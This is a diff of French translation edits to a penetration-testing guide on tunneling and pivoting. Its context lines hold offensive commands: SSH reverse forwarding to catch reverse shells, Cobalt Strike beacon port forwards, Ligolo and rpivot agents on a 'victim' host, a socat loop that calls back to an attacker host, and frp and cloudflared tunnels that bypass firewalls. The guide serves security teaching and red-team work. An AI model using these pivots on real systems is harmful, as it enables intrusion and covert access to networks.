@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### Reverse Port Forwarding
 
-Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes à travers une DMZ vers votre hôte :
+Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes via une DMZ vers votre hôte :
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Sécurité – Attaque Terrapin (CVE-2023-48795)**
-> L'attaque de rétrogradation Terrapin de 2023 peut permettre à un homme du milieu de manipuler la première poignée de main SSH et d'injecter des données dans **n'importe quel canal transféré** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont corrigés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de compter sur les tunnels SSH.
+> L'attaque de rétrogradation Terrapin 2023 peut permettre à un attaquant de type homme du milieu de manipuler le début de la poignée de main SSH et d'injecter des données dans **n'importe quel canal transféré** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont corrigés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de compter sur les tunnels SSH.
 
 ## SSHUTTLE
 
@@ -163,7 +163,7 @@ rportfwd stop [bind port]
 ### rPort2Port local
 
 > [!WARNING]
-> Dans ce cas, le **port est ouvert sur l'hôte beacon**, pas sur le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
+> Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -223,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Liaison et Écoute de l'Agent
+### Liaison et Écoute
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivoter à travers **NTLM proxy**
+Pivot à travers **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -316,7 +316,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Connectez le port SSH local (22) au port 443 de l'hôte attaquant
+Connectez le port SSH local (22) au port 443 de l'hôte attaquant.
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -350,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Vous devez avoir **un accès RDP sur le système**.\
 Téléchargez :
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. DVC est responsable de **tunneling des paquets sur la connexion RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. DVC est responsable de **l'acheminement des paquets sur la connexion RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
@@ -484,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **est un outil pour exposer des solutions à Internet en une ligne de commande.**\
-_Exposition URI sont comme:_ **UID.ngrok.io**
+_Les URI d'exposition sont comme :_ **UID.ngrok.io**
 
 ### Installation
 
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent **des services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrantes, en utilisant l'edge de Cloudflare comme point de rendez-vous. C'est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.
+Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent des **services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrant, en utilisant l'edge de Cloudflare comme point de rendez-vous. Cela est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.
 
 ### Quick tunnel one-liner
 ```bash
@@ -578,7 +578,7 @@ Parce que tout le trafic quitte l'hôte **sortant sur 443**, les tunnels Cloudfl
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) est un reverse-proxy Go activement maintenu qui prend en charge **TCP, UDP, HTTP/S, SOCKS et P2P NAT-hole-punching**. À partir de **v0.53.0 (mai 2024)**, il peut agir comme un **SSH Tunnel Gateway**, permettant à un hôte cible de créer un tunnel inverse en utilisant uniquement le client OpenSSH standard – aucun binaire supplémentaire requis.
+[`frp`](https://github.com/fatedier/frp) est un reverse-proxy Go activement maintenu qui prend en charge **TCP, UDP, HTTP/S, SOCKS et le P2P NAT-hole-punching**. À partir de **v0.53.0 (mai 2024)**, il peut agir comme une **passerelle de tunnel SSH**, permettant à un hôte cible de créer un tunnel inverse en utilisant uniquement le client OpenSSH standard – aucun binaire supplémentaire requis.
 
 ### Tunnel TCP inverse classique
 ```bash
@@ -599,7 +599,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Utilisation du nouveau passerelle SSH (sans binaire frpc)
+### Utilisation du nouveau SSH gateway (pas de binaire frpc)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
